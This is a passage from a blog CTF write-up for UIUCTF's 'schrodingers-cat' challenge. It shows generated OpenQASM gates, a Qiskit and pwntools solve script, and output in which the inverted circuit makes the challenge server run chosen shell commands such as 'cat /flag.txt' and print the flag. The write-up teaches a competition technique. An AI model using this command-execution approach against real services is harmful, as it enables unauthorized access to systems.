+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { rz(-3*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex4_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
+</span></span><span style=display:flex><span>gate multiplex5_dg q0,q1,q2,q3,q4 { multiplex4_reverse_dg q0,q1,q2,q3; cx q4,q0; multiplex4_dg q0,q1,q2,q3; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(0.2641656955605965) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.24620498195865706) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.13304641215336743) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.01903161831016388) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.12663407193268572) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_reverse_dg q0 { ry(-0.09527394434543975) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.05433464108732317) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.1060830543044343) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex4_reverse_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_reverse_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.06462168712231717) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.29540766001335417) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.18770789826999093) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.11911287309309918) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.01098245402315881) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.09274358322577816) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.592259604583806) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { ry(0.9352205187953326) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex4_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
+</span></span><span style=display:flex><span>gate multiplex5_reverse_dg q0,q1,q2,q3,q4 { multiplex4_reverse_dg q0,q1,q2,q3; cx q4,q0; multiplex4_reverse_reverse_dg q0,q1,q2,q3; }
+</span></span><span style=display:flex><span>gate multiplex1_dg q0 { rz(-pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { rz(-5*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { rz(pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { rz(5*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { rz(-pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { rz(-7*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex4_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_dg q0,q1,q2; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.3783961689717087) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.04073757609819237) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_reverse_dg q0 { ry(-0.5007054391135967) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.02626448423846639) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_reverse_dg q0,q1,q2 { multiplex2_reverse_reverse_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.14140732001433892) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(0.38765650017793357) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.14793357589641526) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { ry(0.80272426096507) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex4_reverse_dg q0,q1,q2,q3 { multiplex3_reverse_dg q0,q1,q2; cx q3,q0; multiplex3_reverse_reverse_dg q0,q1,q2; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { rz(3*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { rz(5*pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.24253725285517136) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_reverse_dg q0 { ry(-0.6450812692512188) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_reverse_dg q0,q1 { multiplex1_reverse_reverse_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(0.25440434302082787) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { ry(0.8226285605461638) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex3_reverse_dg q0,q1,q2 { multiplex2_reverse_dg q0,q1; cx q2,q0; multiplex2_reverse_reverse_dg q0,q1; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { rz(-pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_reverse_dg q0 { ry(-0.688784396189229) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { ry(1.2092925685570255) q0; }
+</span></span><span style=display:flex><span>gate multiplex2_reverse_dg q0,q1 { multiplex1_reverse_dg q0; cx q1,q0; multiplex1_reverse_reverse_dg q0; }
+</span></span><span style=display:flex><span>gate multiplex1_dg q0 { rz(pi/16) q0; }
+</span></span><span style=display:flex><span>gate multiplex1_reverse_dg q0 { ry(0.6630894419589923) q0; }
+</span></span><span style=display:flex><span>gate disentangler_dg q0,q1,q2,q3,q4 { multiplex1_reverse_dg q4; multiplex1_dg q4; multiplex2_reverse_dg q3,q4; multiplex2_dg q3,q4; multiplex3_reverse_dg q2,q3,q4; multiplex3_dg q2,q3,q4; multiplex4_reverse_dg q1,q2,q3,q4; multiplex4_dg q1,q2,q3,q4; multiplex5_reverse_dg q0,q1,q2,q3,q4; multiplex5_dg q0,q1,q2,q3,q4; }
+</span></span><span style=display:flex><span>gate state_preparation(param0,param1,param2,param3,param4,param5,param6,param7,param8,param9,param10,param11,param12,param13,param14,param15,param16,param17,param18,param19,param20,param21,param22,param23,param24,param25,param26,param27,param28,param29,param30,param31) q0,q1,q2,q3,q4 { disentangler_dg q0,q1,q2,q3,q4; }
+</span></span><span style=display:flex><span>qreg q[5];
+</span></span><span style=display:flex><span>state_preparation(0.9076335045793169,-0.044122507924259646,0.01634292182813989,0.036987216556996244,-0.06906886425742421,-0.04673536929108797,-0.017528244610158387,0.014276207361454615,-0.2069271092485318,-0.011712786897487532,-0.02737253540530897,0.05108333711049387,-0.10947421547863946,0.0023917498632471737,0.01199106440311292,0.027422162932615034,-0.06468989291435842,0.023822905422690187,0.07320341986891087,-0.03106169917306942,0.15398961505027625,0.023460152088682004,-0.02452697057328079,-0.00234619511834995,0.26119513377737485,0.005355465113197955,-0.029807415041486443,-0.019680937823715723,-0.007608828289073272,-0.0009596579516268702,0.011861404188523104,-0.016727636286929682) q[0],q[1],q[2],q[3],q[4];
+</span></span></code></pre></div><p>Thankfully, fixing this isn&rsquo;t too hard, but I did get stuck here for a while. It turns out the fix is to transpile the circuit to only a specific set of gates before calling <code>qasm()</code>, like so:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(X), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc_transpiled <span style=color:#f92672>=</span> transpile(qc, basis_gates<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;u1&#39;</span>, <span style=color:#e6db74>&#39;u2&#39;</span>, <span style=color:#e6db74>&#39;u3&#39;</span>, <span style=color:#e6db74>&#39;cx&#39;</span>])
+</span></span><span style=display:flex><span>print(qc_transpiled<span style=color:#f92672>.</span>qasm())
+</span></span></code></pre></div><p>Putting this back into our solve script, we can see that we&rsquo;re actually able to execute commands on the server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> numpy <span style=color:#66d9ef>as</span> np
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> qiskit <span style=color:#f92672>import</span> QuantumCircuit, transpile
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> qiskit.quantum_info <span style=color:#66d9ef>as</span> qi
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> qiskit.circuit.library <span style=color:#f92672>import</span> StatePreparation
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> server <span style=color:#f92672>import</span> normalization, transform
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(M<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>T, T_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;PWNED!&#39;&#34;</span>)
+</span></span><span style=display:flex><span>inv_mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>inv(M)
+</span></span><span style=display:flex><span>X <span style=color:#f92672>=</span> inv_mat <span style=color:#f92672>@</span> T
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(X), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc_transpiled <span style=color:#f92672>=</span> transpile(qc, basis_gates<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;u1&#39;</span>, <span style=color:#e6db74>&#39;u2&#39;</span>, <span style=color:#e6db74>&#39;u3&#39;</span>, <span style=color:#e6db74>&#39;cx&#39;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
+</span></span><span style=display:flex><span>qasm_str <span style=color:#f92672>=</span> b64encode(qc_transpiled<span style=color:#f92672>.</span>qasm()<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
+</span></span><span style=display:flex><span><span style=color:#75715e># nc schrodingers-cat.chal.uiuc.tf 1337</span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;schrodingers-cat.chal.uiuc.tf&#34;</span>, <span style=color:#ae81ff>1337</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Please type your OpenQASM circuit as a base64 encoded string: &#39;</span>, qasm_str)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Please enter your normalization constant (precision matters!): &#34;</span>, str(T_n)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rest <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvall()<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>print(rest)
+</span></span></code></pre></div><pre tabindex=0><code>     ┌──────────────┐┌───────────────────────┐
+q_0: ┤0             ├┤0                      ├
+     │              ││                       │
+q_1: ┤1             ├┤1                      ├
+     │              ││                       │
+q_2: ┤2 circuit-298 ├┤2 echo &#39;Hello, world!&#39; ├
+     │              ││                       │
+q_3: ┤3             ├┤3                      ├
+     │              ││                       │
+q_4: ┤4             ├┤4                      ├
+     └──────────────┘└───────────────────────┘
+
+Executing...
+PWNED!
+</code></pre><p>Now it&rsquo;s just an easy case of calling <code>cat /flag.txt</code>, and getting our flag!</p><p>filename=solve.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> numpy <span style=color:#66d9ef>as</span> np
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> qiskit <span style=color:#f92672>import</span> QuantumCircuit, transpile
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> qiskit.quantum_info <span style=color:#66d9ef>as</span> qi
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> qiskit.circuit.library <span style=color:#f92672>import</span> StatePreparation
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> server <span style=color:#f92672>import</span> normalization, transform
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>server_sv, server_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>) 
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(server_sv), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Operator(qc)
+</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>array(M<span style=color:#f92672>.</span>data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>T, T_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;cat /flag.txt&#34;</span>)
+</span></span><span style=display:flex><span>inv_mat <span style=color:#f92672>=</span> np<span style=color:#f92672>.</span>linalg<span style=color:#f92672>.</span>inv(M)
+</span></span><span style=display:flex><span>X <span style=color:#f92672>=</span> inv_mat <span style=color:#f92672>@</span> T
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>append(StatePreparation(X), range(<span style=color:#ae81ff>5</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc_transpiled <span style=color:#f92672>=</span> transpile(qc, basis_gates<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;u1&#39;</span>, <span style=color:#e6db74>&#39;u2&#39;</span>, <span style=color:#e6db74>&#39;u3&#39;</span>, <span style=color:#e6db74>&#39;cx&#39;</span>], optimization_level<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
+</span></span><span style=display:flex><span>qasm_str <span style=color:#f92672>=</span> b64encode(qc_transpiled<span style=color:#f92672>.</span>qasm()<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
+</span></span><span style=display:flex><span><span style=color:#75715e># nc schrodingers-cat.chal.uiuc.tf 1337</span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;schrodingers-cat.chal.uiuc.tf&#34;</span>, <span style=color:#ae81ff>1337</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Please type your OpenQASM circuit as a base64 encoded string: &#39;</span>, qasm_str)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Please enter your normalization constant (precision matters!): &#34;</span>, str(T_n)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rest <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvall()<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>print(rest)
+</span></span></code></pre></div><pre tabindex=0><code>     ┌──────────────┐┌───────────────────────┐
+q_0: ┤0             ├┤0                      ├
+     │              ││                       │
+q_1: ┤1             ├┤1                      ├
+     │              ││                       │
+q_2: ┤2 circuit-298 ├┤2 echo &#39;Hello, world!&#39; ├
+     │              ││                       │
+q_3: ┤3             ├┤3                      ├
+     │              ││                       │
+q_4: ┤4             ├┤4                      ├
+     └──────────────┘└───────────────────────┘
+
+Executing...
+uiuctf{f3yn_m4n_h3r32_j00r_fL49}
+</code></pre><h2 id=conclusion>Conclusion</h2><p>I had a lot of fun solving this challenge, and it was really interesting to see a real Qiskit challenge in a CTF. My bare minimum amount of experience with quantum computing was actually enough to solve this challenge, and I felt like it was the perfect difficulty for me.</p><p>Other than that, the challenge itself was also really open-ended, leading to several other possible solutions.</p><p>For example, you could <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.inverse.html#qiskit.circuit.QuantumCircuit.inverse>invert the circuit</a> entirely, and just put that at the end of your own circuit while still creating the desired statevector beforehand. This cancels out the server&rsquo;s circuit like so:</p><p>$$
+\begin{align}
+M &= \text{matrix representation of the circuit} \\
+T &= \text{target statevector} \\
+\newline
+M^{-1} &= \text{inverse of M} \\
+M^{-1}M T &= X \ \ \text{(this is the entire circuit)}\\
+IT &= X \ \ \text{(since } M^{-1}M = I\text{)}\\
+X &= T
+\end{align}
+$$</p><p>Anyway, I hope you had as much fun reading these writeups as I did originally solving these challenges :)</p></div></div></main></div><script>function handle_open(e){let t=e.target;e.target.tagName==="SUMMARY"&&(t=e.target.querySelector(".code-summary-inner")),t.classList.toggle("open"),t.classList.contains("open")?t.textContent="Click to collapse "+t.textContent.split(" ").slice(3).join(" "):t.textContent="Click to expand "+t.textContent.split(" ").slice(3).join(" ")}let code_divs=document.querySelectorAll("div.highlight"),to_remove=[];for(let e of code_divs){let t="",n=e.previousElementSibling;n.tagName=="P"&&(n=n.textContent,n.startsWith("filename")&&(t=n.split("=")[1].trim(),to_remove.push(e.previousElementSibling)));let s=e.querySelector("pre code"),o=s.textContent.split(`
 `).length;if(t!==""||o>10){let n=document.createElement("details"),o=document.createElement("summary"),i=document.createElement("span");i.textContent="Click to expand",t!==""&&(i.textContent+=" "+t,n.setAttribute("id",t)),i.classList.add("code-summary-inner"),o.appendChild(i),o.addEventListener("click",handle_open),o.classList.add("code-summary"),s.classList.add("code-inner"),e.parentNode.insertBefore(n,e),n.appendChild(o),n.appendChild(e),n.classList.add("code-wrapper")}}for(let e of to_remove)e.remove();let anchors=document.querySelectorAll(".postWrapper a");for(let e of anchors)e.host!==window.location.host&&(e.setAttribute("target","_blank"),e.setAttribute("rel","noopener noreferrer"))</script><footer class=footer>© 2023 flocto, Built with
 <a href=https://gohugo.io class=footerLink>Hugo</a> and (an edited)
-<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</footer></div></body></html>
+<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</footer><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]],processEscapes:!0,processEnvironments:!0},options:{skipHtmlTags:["script","noscript","style","textarea","pre"]}},window.addEventListener("load",e=>{document.querySelectorAll("mjx-container").forEach(function(e){e.parentElement.classList+="has-jax"})})</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script></div></body></html>
